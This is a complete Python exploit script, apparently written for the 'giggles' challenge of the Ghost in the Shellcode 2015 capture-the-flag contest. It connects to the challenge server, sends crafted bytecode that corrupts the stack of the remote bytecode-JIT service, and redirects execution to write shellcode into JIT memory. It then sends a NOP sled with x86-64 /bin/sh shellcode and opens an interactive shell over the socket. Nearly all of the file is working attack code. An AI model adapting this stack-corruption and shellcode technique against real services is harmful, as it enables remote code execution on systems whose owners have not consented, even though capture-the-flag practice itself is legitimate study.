#!/usr/bin/python

import socket
import struct
import sys
import telnetlib

TYPE_ADDFUNC = 0
TYPE_VERIFY = 1
TYPE_RUNFUNC = 2

OP_ADD = 0
OP_BR = 1
OP_BEQ = 2
OP_BGT = 3
OP_MOV = 4
OP_OUT = 5
OP_EXIT = 6

def createOperation(op, opnd1, opnd2, opnd3):
    operation = struct.pack("H", op)
    operation += struct.pack("Q", opnd1)
    operation += struct.pack("Q", opnd2)
    operation += struct.pack("Q", opnd3)
    return operation

def createFunction(num_ops, num_args, bytecode):
    function = struct.pack("H", num_ops)
    function += struct.pack("H", num_args)
    function += struct.pack("B", 0)
    function += bytecode
    return function

def addFunction(sockfd, function):
    packet = struct.pack("B", TYPE_ADDFUNC)
    packet += struct.pack("H", len(function))
    packet += function
    sockfd.send(packet)
    sockfd.recv(2)
    if (struct.unpack("I", sockfd.recv(4))[0] != 0):
        print "error"
        sys.exit(0);

def verifyFunction(sockfd, idx):
    packet = struct.pack("B", TYPE_VERIFY)
    packet += struct.pack("H", 2)
    packet += struct.pack("H", idx)
    sockfd.send(packet)
    sockfd.recv(2)
    if (struct.unpack("I", sockfd.recv(4))[0] != 0):
        print "error"
        sys.exit(0);

def runFunction(sockfd, idx, args):
    packet = struct.pack("B", TYPE_RUNFUNC)
    packet += struct.pack("H", 4 + 4 * len(args))

    packet += struct.pack("H", idx)
    packet += struct.pack("H", len(args))
#    packet += struct.pack("H", 10)

    for arg in args:
        packet += struct.pack("I", arg)

    sockfd.send(packet)
#    outlen = struct.unpack("H", sockfd.recv(2))[0]
#    if (outlen != 0):
#        return sockfd.recv(outlen)
#    else:
#        return ""

sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sockfd.connect(('giggles.2015.ghostintheshellcode.com', 1423))
#sockfd.connect(('192.168.1.40', 1423))


operations = createOperation(OP_OUT, 4, 0, 0)
operations += createOperation(OP_OUT, 2, 3, 0)
operations += createOperation(OP_OUT, 0, 0xbbbbbbbbbbbbbbbb, 0xfffffffffffffff)
operations += createOperation(OP_OUT, 0, 0x1111111111111111, 0xfffffffffffffff)
operations += createOperation(OP_OUT, 0, 0x2222222222222222, 0xfffffffffffffff)
operations += createOperation(OP_OUT, 0, 0x3333333333333333, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x4444444444444444, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x5555555555555555, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x6666666666666666, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x7777777777777777, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x8888888888888888, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x9999999999999999, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0xaaaaaaaaaaaaaaaa, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0xbbbbbbbbbbbbbbbb, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0xcccccccccccccccc, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0xdddddddddddddddd, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0xeeeeeeeeeeeeeeee, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0xffffffffffffffff, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x1111111111111111, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x2222222222222222, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x3333333333333333, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x4444444444444444, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x5555555555555555, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x6666666666666666, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x7777777777777777, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x8888888888888888, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0x9999999999999999, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0xaaaaaaaaaaaaaaaa, 0x123456789abcdef)
operations += createOperation(OP_OUT, 4, 0xbbbbbbbbbbbbbbbb, 0x123456789abcdef)
operations += createOperation(OP_BR, 30, 0xffffffffffffffff, 0xfffffffffffffff)


function = createFunction(30, 2, operations)
addFunction(sockfd, function)

""" 
we can read write any variable on stack
so rewrite variables on stack of handleConnection
and jump to readAll+... when edi, esi and edx end copy to stack:

0000000000001595 <readAll>:
        1595:   55                      push   rbp
        1596:   48 89 e5                mov    rbp,rsp
        1599:   48 83 ec 30             sub    rsp,0x30
        159d:   89 7d ec                mov    DWORD PTR [rbp-0x14],edi
        15a0:   48 89 75 e0             mov    QWORD PTR [rbp-0x20],rsi
        15a4:   48 89 55 d8             mov    QWORD PTR [rbp-0x28],rdx
        15a8:   48 c7 45 f8 00 00 00    mov    QWORD PTR [rbp-0x8],0x0    <--- JUMP HERE
        15af:   00 
        15b0:   48 8b 45 d8             mov    rax,QWORD PTR [rbp-0x28]


Then we send shellcode and jump to JIT

JIT = funcs + const ( 0xffdf6e80 for ubuntu 14.04 )

    rewrite rbp-0x14 ( sock )
    rewrite rbp-0x20 ( buf  )
    rewrite rpb-0x28 ( len  )
"""
# somewhere here set sock and len
operations  = createOperation(0x0000, 0x0000000002000000, 0xBBBBBBBBBB000000, 0x00000e0004CCCCCC)
operations += createOperation(0x0000, 0x0000000002000000, 0x2222222222000000, 0x0000260004333333)
operations += createOperation(0x0000, 0x0000000003000000, 0x5555555555000000, 0x0000270004666666)
operations += createOperation(0x0000, 0x0000000009000000, 0x8888888888000000, 0x0000400001999999) # 0x000040 - jump to next instruction


# 4 - OP_MOV, 0x2b - first parametr
function = createFunction(4, 0x2b, operations)

raw_input("hehehe...")

addFunction(sockfd, function)

operations  = createOperation(0x0000, 0x1111111111111111, 0x2222222222222222, 0x3333333333333333)
operations += createOperation(0x0000, 0x4444444444444444, 0x5555555555555555, 0x6666666666666666)
operations += createOperation(0x0000, 0x7777777777777777, 0x8888888888888888, 0x9999999999999999)

# copy funcs 4 bytes to $rbp-0x28
operations += createOperation(0x0000, 0xaaaaaaaaaaaaaaaa, 0x000422223333bbbb, 0x0000000000000028)

# copy funcs next 4 bytes to $rbp-0x29
operations += createOperation(0xfff6, 0x0000ffffffffffff, 0x0004eeeeeeeeeeee, 0x0000000000000029)

# add offset to $rbp-0x28 for getting JIT address
operations += createOperation(0xfff5, 0x0000ffffffffffff, 0x0000ffffffffffff, 0x0000000000000028)

# rewrite RIP to readAll for writting shellcode to JIT
operations += createOperation(0x0008, 0xffff000000000000, 0x0000ffffffffffff, 0x000000000000001a)

# rewrite next RIP to JIT 4 bytes
operations += createOperation(0x0006, 0xffff000000000000, 0x0004ffffffffffff, 0x0000000000000032)

# rewrite next RIP to JIT next 4 bytes
operations += createOperation(0x0028, 0xffff000000000000, 0x0004ffffffffffff, 0x0000000000000033)

 # exit from executeCode and jump to readAll, then to JIT
operations += createOperation(0x0029, 0xffff000000000000, 0xbbbbffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff)
operations += createOperation(0x0000, 0xffffffffffffffff, 0xffffffffffffffff, 0x2800040000000000)
operations += createOperation(0x0000, 0xfffff60000000000, 0x000000ffffffffff, 0x2900040000000000)
operations += createOperation(0x0000, 0xfffff50000000000, 0x000000ffffffffff, 0x2800000000000000)
operations += createOperation(0x0000, 0x0000080000000000, 0x2222220000000000, 0xff000033aaaaaaaa)
operations += createOperation(0x0000, 0x0000070000000000, 0x6666660000000000, 0x1a00007777777777)
operations += createOperation(0x0000, 0x0000060000000000, 0x1234560000000000, 0x3200040000000000)
operations += createOperation(0x0000, 0x0000280000000000, 0x0000000000000000, 0x3300040000000000)
operations += createOperation(0x0000, 0x0000290000000000, 0x0000000000000000, 0xbbbbbbbbbbbbbbbb)
operations += createOperation(0xcccc, 0xdddddddddddddddd, 0xeeeeeeeeeeeeeeee, 0xffffffffffffffff)
function = createFunction(30, 2, operations)
addFunction(sockfd, function)







verifyFunction(sockfd, 0)

#for i in range(1, 101):
#    print int(runFunction(sockfd, 0, [i, i, 0xfffff4e8, 0]), 16)  sendall
#    0xfffffc0f mmap
runFunction(sockfd, 0, [1, 1, 0x4, 512, 0x200, 0x00000000, 0xfffff6ab, 0xffffffa0, 0xffdf6e80])

#raw_input("STAGE 2...")
shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x0b\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x3c\x26\x34\x00\x56\x57\x48\x89\xe6\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"


print len(shellcode)
sockfd.send(shellcode)

t = telnetlib.Telnet()
t.sock = sockfd
t.interact()
